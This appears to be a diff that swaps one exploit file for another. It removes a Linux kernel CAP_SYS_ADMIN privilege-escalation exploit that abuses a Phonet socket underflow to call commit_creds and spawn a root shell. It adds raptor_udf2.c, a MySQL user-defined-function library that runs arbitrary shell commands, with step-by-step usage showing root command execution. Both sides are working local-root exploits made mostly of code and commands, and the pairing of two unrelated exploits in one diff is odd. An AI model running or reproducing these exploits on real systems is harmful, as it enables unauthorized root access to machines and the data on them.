@@ -1,215 +1,94 @@
 /*
- * Linux Kernel CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit)
- * by Joe Sylve
- * @jtsylve on twitter
+ * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $
  *
- * Released: Jan 7, 2011
+ * raptor_udf2.c - dynamic library for do_system() MySQL UDF
+ * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
  *
- * Based on the bug found by Dan Rosenberg (@djrbliss)
- * only loosly based on his exploit http://www.exploit-db.com/exploits/15916/
- * 
+ * This is an helper dynamic library for local privilege escalation through
+ * MySQL run with root privileges (very bad idea!), slightly modified to work 
+ * with newer versions of the open-source database. Tested on MySQL 4.1.14.
+ *
+ * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c
+ *
+ * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes
+ * for the security vulnerabilities in the handling of User Defined Functions
+ * (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further
+ * details, please refer to:
+ *
+ * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html
+ * http://www.wisec.it/vulns.php?page=4
+ * http://www.wisec.it/vulns.php?page=5
+ * http://www.wisec.it/vulns.php?page=6
+ *
+ * "UDFs should have at least one symbol defined in addition to the xxx symbol 
+ * that corresponds to the main xxx() function. These auxiliary symbols 
+ * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and 
+ * xxx_add() functions". -- User Defined Functions Security Precautions 
+ *
  * Usage:
- * gcc -w caps-to-root2.c -o caps-to-root2
- * sudo setcap cap_sys_admin+ep caps-to-root2
- * ./caps-to-root2
+ * $ id
+ * uid=500(raptor) gid=500(raptor) groups=500(raptor)
+ * $ gcc -g -c raptor_udf2.c
+ * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+ * $ mysql -u root -p
+ * Enter password:
+ * [...]
+ * mysql> use mysql;
+ * mysql> create table foo(line blob);
+ * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
+ * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+ * mysql> create function do_system returns integer soname 'raptor_udf2.so';
+ * mysql> select * from mysql.func;
+ * +-----------+-----+----------------+----------+
+ * | name      | ret | dl             | type     |
+ * +-----------+-----+----------------+----------+
+ * | do_system |   2 | raptor_udf2.so | function |
+ * +-----------+-----+----------------+----------+
+ * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
+ * mysql> \! sh
+ * sh-2.05b$ cat /tmp/out
+ * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
+ * [...]
  *
- * Kernel Version >= 2.6.34 (untested on earlier versions)
+ * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys
  *
- * Tested on Ubuntu 10.10 64-bit and Ubuntu 10.10 32-bit
- *
- * This exploit takes advantage of the same underflow as the original,
- * but takes a different approach.  Instead of underflowing into userspace
- * (which doesn't work on 64-bit systems and is a lot of work), I underflow 
- * to some static values inside of the kernel which are referenced as pointers
- * to userspace.  This method is pretty simple and seems to be reliable.
  */
 
 #include <stdio.h>
-#include <sys/socket.h>
-#include <errno.h>
-#include <string.h>
-#include <sys/mman.h>
-#include <unistd.h>
+#include <stdlib.h>
 
-// Skeleton Structures of the Kernel Structures we're going to spoof
-struct proto_ops_skel {
-	int	family;
-	void  *buffer1[8];
-	int	(*ioctl)(void *, int, long);
-	void  *buffer2[12];
-};
+enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
 
-struct phonet_protocol_skel {
-	void	*ops;
-	void	*prot;
-	int	sock_type;	
-};
+typedef struct st_udf_args {
+	unsigned int		arg_count;	// number of arguments
+	enum Item_result	*arg_type;	// pointer to item_result
+	char 			**args;		// pointer to arguments
+	unsigned long		*lengths;	// length of string args
+	char			*maybe_null;	// 1 for maybe_null args
+} UDF_ARGS;
 
+typedef struct st_udf_init {
+	char			maybe_null;	// 1 if func can return NULL
+	unsigned int		decimals;	// for real functions
+	unsigned long 		max_length;	// for string functions
+	char			*ptr;		// free ptr for func data
+	char			const_item;	// 0 if result is constant
+} UDF_INIT;
 
-#ifdef __x86_64__ 
-
-#define SYM_NAME "local_port_range"
-#define SYM_ADDRESS 0x0000007f00000040
-#define SYM_OFFSET 0x0
-
-typedef int (* _commit_creds)(unsigned long cred);
-typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);
-
-#else //32-bit
-
-#define SYM_NAME "pn_proto"
-#define SYM_ADDRESS 0x4e4f4850
-#define SYM_OFFSET 0x90
-
-typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
-typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
-
-#endif
-
-
-_commit_creds commit_creds;
-_prepare_kernel_cred prepare_kernel_cred;
-
-int getroot(void * v, int i, long l)
+int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
 {
-	commit_creds(prepare_kernel_cred(0));
-	return 0;      
+	if (args->arg_count != 1)
+		return(0);
+
+	system(args->args[0]);
+
+	return(0);
 }
 
-/* thanks spender... */
-unsigned long get_kernel_sym(char *name)
+char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
 {
-	FILE *f;
-	unsigned long addr;
-	char dummy;
-	char sname[512];
-	int ret;
-
-	char command[512];
-
-	sprintf(command, "grep \"%s\" /proc/kallsyms", name);
-
-	f = popen(command, "r");
-
-	while(ret != EOF) {
-		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);
-
-		if (ret == 0) {
-			fscanf(f, "%s\n", sname);
-			continue;
-		}
-
-		if (!strcmp(name, sname)) {
-
-			fprintf(stdout, " [+] Resolved %s to %p\n", name, (void *)addr);
-			pclose(f);
-			return addr;
-		}
-	}
-
-	pclose(f);
-	return 0;
+	return(0);
 }
 
-int main(int argc, char * argv[])
-{
-
-	int sock, proto;
-	unsigned long proto_tab, low_kern_sym, pn_proto;
-	void * map;
-
-	/* Create a socket to load the module for symbol support */
-	printf("[*] Testing Phonet support and CAP_SYS_ADMIN...\n");
-	sock = socket(PF_PHONET, SOCK_DGRAM, 0);
-
-	if(sock < 0) {
-		if(errno == EPERM)
-			printf("[*] You don't have CAP_SYS_ADMIN.\n");
-
-		else
-			printf("[*] Failed to open Phonet socket.\n");
-
-		return -1;
-	}
-
-	close(sock);
-
-	/* Resolve kernel symbols */
-	printf("[*] Resolving kernel symbols...\n");
-
-	proto_tab = get_kernel_sym("proto_tab");
-	low_kern_sym = get_kernel_sym(SYM_NAME) + SYM_OFFSET;
-	pn_proto =  get_kernel_sym("pn_proto");
-	commit_creds = (void *) get_kernel_sym("commit_creds");
-	prepare_kernel_cred = (void *) get_kernel_sym("prepare_kernel_cred");
-
-	if(!proto_tab || !commit_creds || !prepare_kernel_cred) {
-		printf("[*] Failed to resolve kernel symbols.\n");
-		return -1;
-	}
-
-	if (low_kern_sym >= proto_tab) {
-		printf("[*] %s is mapped higher than prototab.  Can not underflow :-(.\n", SYM_NAME);
-		return -1;
-	}
-
-
-	/* Map it */
-	printf("[*] Preparing fake structures...\n");
-
-	const struct proto_ops_skel fake_proto_ops2 = {
-			.family		= AF_PHONET,	
-			.ioctl		= &getroot,
-	};		
-
-	struct phonet_protocol_skel pps = {
-			.ops = (void *) &fake_proto_ops2,
-			.prot = (void *) pn_proto,
-			.sock_type = SOCK_DGRAM,
-	};
-
-	printf("[*] Copying Structures.\n");
-
-	map = mmap((void *) SYM_ADDRESS, 0x1000,
-			PROT_READ | PROT_WRITE | PROT_EXEC,
-			MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-
-	if(map == MAP_FAILED) {
-		printf("[*] Failed to map landing area.\n");
-		perror("mmap");
-		return -1;
-	}
-
-	
-	memcpy((void *) SYM_ADDRESS, &pps, sizeof(pps));
-
-	// Calculate Underflow
-	proto = -((proto_tab - low_kern_sym) / sizeof(void *));
-
-	printf("[*] Underflowing with offset %d\n", proto);
-
-	sock = socket(PF_PHONET, SOCK_DGRAM, proto);
-
-	if(sock < 0) {
-		printf("[*] Underflow failed :-(.\n");
-		return -1;
-	} 
-
-	printf("[*] Elevating privlidges...\n");
-	ioctl(sock, 0, NULL);
-
-
-	if(getuid()) {
-		printf("[*] Exploit failed to get root.\n");
-		return -1;
-	}
-
-	printf("[*] This was a triumph... I'm making a note here, huge success.\n");
-	execl("/bin/sh", "/bin/sh", NULL);
-
-	close(sock);
-	munmap(map, 0x1000);
-
-	return 0;
-}
+// milw0rm.com [2006-02-20]
             
